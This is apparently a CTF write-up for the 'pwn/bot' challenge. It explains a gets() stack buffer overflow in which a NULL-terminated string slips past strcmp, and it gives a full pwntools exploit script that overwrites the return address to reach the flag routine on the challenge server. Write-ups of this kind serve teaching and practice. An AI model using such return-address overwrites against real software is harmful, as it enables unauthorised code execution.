+++
authors = ["laozi"]
title = "pwn/bot"
date = "2023-02-12"
+++

### The challenge

This was a simple buffer overflow. The program runs `gets()` which
is a huge vulnerability since it doesn't have the size specified.
There's also a bug with `strcmp()` that stops reading the input after
a NULL byte. So the problem asks for your input and then compares it
with a few strings before returning. All you have to do is write one
of the strings terminated with a NULL byte then write the buffer
overflow. There was a "get flag" section of the code so I just overwrote
the return address with that section:

```python
#!/usr/bin/env python3
from pwn import *
elf = ELF("./bot_patched")
context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf
debug_script = '''
'''
def conn():
    if not args.REMOTE:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, gdbscript=debug_script)
    else:
        p = remote("lac.tf", 31180)
    return p
p = conn()
p.recv()
payload = b"may i have the flag?\0"
payload += b"A"*(64-len(payload))
payload += b'BBBBBBBB'
payload += p64(0x40129a)
p.sendline(payload)
p.interactive()
```
